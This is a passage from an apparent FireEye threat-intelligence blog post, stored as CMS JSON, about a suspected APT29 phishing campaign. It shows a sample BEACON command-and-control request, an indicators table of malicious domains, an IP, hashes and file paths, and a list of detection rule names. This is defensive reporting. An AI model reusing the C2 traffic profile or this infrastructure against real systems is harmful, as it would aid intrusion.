href=\u0022https:\/\/github.com\/rsmudge\/Malleable-C2-Profiles\/blob\/390937aec01e0bcdaf23312277e96e57ac925f7b\/normal\/pandora.profile\u0022\u003Epublicly available Pandora C2 profile\u003C\/a\u003E. The profile may have been changed to bypass common detections for the publicly available malleable profiles. The following is a sample GET request:\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022code\u0022\u003EGET \/access\/?version=4\u0026amp;lid=1582502724\u0026amp;token=ajlomeomnmeapoagcknffjaehikhmpep\u003Cbr\u003E\n Bdhmoefmcnoiohgkkaabfoncfninglnlbmnaahmhjjfnopdapdaholmanofaoodkiokobenhjd\u003Cbr\u003E\n Mjcmoagoimbahnlbdelchkffojeobfmnemdcoibocjgnjdkkbfeinlbnflaeiplendldlbhnhjmbg\u003Cbr\u003E\n agigjniphmemcbhmaibmfibjekfcimjlhnlamhicakfmcpljaeljhcpbmgblgnappmkpbcko\u003Cbr\u003E\n HTTP\/1.1\u003Cbr\u003E\n Accept: *\/*\u003Cbr\u003E\n GetContentFeatures.DLNA.ORG: 1\u003Cbr\u003E\n Host: pandorasong.com\u003Cbr\u003E\n Cookie: __utma=310066733.2884534440.1433201462.1403204372.1385202498.7;\u003Cbr\u003E\n User-Agent: Mozilla\/5.0 (Windows NT 10.0; WOW64; Trident\/7.0; rv:11.0) like\u003Cbr\u003E\n Gecko\u003Cbr\u003E\n Connection: Keep-Alive\u003Cbr\u003E\n Cache-Control: no-cache\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003ESimilarities to Older Activity\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EFigure 5 and Figure 6 show the overlapping characteristics between the LNK used in the recent spear phish emails, \u003Cspan class=\u0022code\u0022\u003Eds7002.lnk\u003C\/span\u003E (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), compared to a suspected APT29 LNK from the November 2016 attack that led to the SPIKERUSH backdoor, \u003Cspan class=\u0022code\u0022\u003E37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk\u003C\/span\u003E (MD5: f713d5df826c6051e65f995e57d6817d).\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/NovAPT29cpe\/Picture5.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: LNK characteristics: new activity (left) and old activity (right)\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/NovAPT29cpe\/Picture6.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: LNK characteristics: new activity (left) and old activity (right)\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EIn addition to similar LNK characteristics, the PowerShell command is very similar to the code from the older sample that executed the SPIKERUSH backdoor. Some of the same variable names are retained in this new version, as seen in Figure 7 and Figure 8.\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/NovAPT29cpe\/Picture7.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: Embedded PowerShell: new activity (left) and old activity (right)\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/NovAPT29cpe\/Picture8.png\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Shared string obfuscation logic: new LNK activity (left) and old VERNALDROP activity (right)\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003EIndicators\u003C\/h4\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022624\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cb\u003EIndicator\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cb\u003EDescription\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003Edosonedrivenotifications-svct-mailboxe36625aaa85747214aa50342836a2315aaa36\u003Cbr\u003E\n928202aa46271691a8255aaa15382822aa25821925a\u003Cbr\u003E\n0245@northshorehealthgm[.]org\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EPhishing email address from likely compromised legitimate server\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EStevenson, Susan N shared \u0026quot;TP18-DS7002 (UNCLASSIFIED)\u0026quot; with you\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EPhishing email subject\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003Ehttps:\/\/www.jmj[.]com\/personal\/nauerthn_state_gov\/*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EMalware hosting location on likely compromised legitimate domain\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003Epandorasong[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EBEACON C2\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E95.216.59[.]92\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EResolution of pandorasong[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E2b13b244aafe1ecace61ea1119a1b2ee\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003ESSL certificate for pandorasong[.]com\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E3fccf531ff0ae6fedd7c586774b17a2d\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EMalicious ZIP archive MD5\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E658c6fe38f95995fa8dc8f6cfe41df7b\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EBenign ZIP archive MD5\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E6ed0020b0851fb71d5b0076f4ee95f3c\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EMalicious LNK file MD5\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E313f4808aa2a2073005d219bc68971cd\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EBenign decoy PDF MD5\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E16bbc967a8b6a365871a05c74a4f345b\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EBEACON DLL MD5\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E%APPDATA%\\Local\\cyzfc.dat\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EBEACON DLL file path\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022354\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E%TEMP%\\ds7002.PDF\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022270\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EBenign decoy PDF file path\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 2: Indicators\u003C\/span\u003E\u003Cb\u003E\u003C\/b\u003E\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003ERelated Samples\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022code\u0022\u003E37486-the-shocking-truth-about-election-rigging-in-america.rtf.lnk\u003C\/span\u003E (MD5: f713d5df826c6051e65f995e57d6817d)\u003C\/p\u003E\n\u003Ch4 style=\u0022text-align: left;\u0022\u003EFireEye Detection\u003C\/h4\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003EFireEye detected this activity across our platform. Table 3 contains the specific detection names that applied to this activity.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022680\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022136\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cb\u003EProduct\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022488\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cb\u003EDetection names\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022136\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003ENetwork Security\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022488\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EMalware.Archive\u003Cbr\u003E\nMalware.Binary.lnk\u003Cbr\u003E\nSuspicious.Backdoor.Beacon\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022136\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EEndpoint Security\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022488\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003ESUSPICIOUS POWERSHELL USAGE (METHODOLOGY)\u003Cbr\u003E\n\u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/products-and-services\/2018\/07\/malwareguard-fireeye-machine-learning-model-to-detect-and-prevent-malware.html\u0022\u003EGeneric.mg.16bbc967a8b6a365\u003C\/a\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022136\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EThreat Analytics Platform\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022488\u0022 valign=\u0022top\u0022\u003E\u003Cp style=\u0022text-align: left;\u0022\u003EWINDOWS METHODOLOGY [PowerShell Base64 String]\u003Cbr\u003E\nWINDOWS METHODOLOGY [Rundll32 Roaming]\u003Cbr\u003E\nWINDOWS METHODOLOGY [PowerShell Script Block Warning]\u003Cbr\u003E\nWINDOWS METHODOLOGY [Base64 Char Args]\u003Cbr\u003E\nTADPOLE DOWNLOADER [Rundll Args]\u003Cbr\u003E\nINTEL HIT - IP [Structured Threat Reputation-Based]\u003Cbr\u003E\nINTEL HIT - FQDN [Structured Threat Reputation-Based] [DNS]\u003Cbr\u003E\nINTEL HIT - FQDN [Structured Threat Reputation-Based] [Non-DNS]\u003Cbr\u003E\nINTEL HIT - FILE HASH [Structured Threat Reputation-Based]\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp style=\u0022text-align: left;\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 3: FireEye product detections\u003C\/span\u003E\u003C\/p\u003E\n",
        "jcr:lastModified": "Mon Nov 19 2018 17:22:59 GMT-0500",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EFireEye detected new targeted phishing activity at more than 20 of our clients across multiple industries.\u003C\/p\u003E\n",
      "jcr:lastModified": "Mon Nov 19 2018 16:27:40 GMT-0500",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Mon Nov 19 2018 16:32:02 GMT-0500",
      "imageRotate": "0"
    }
  }
}
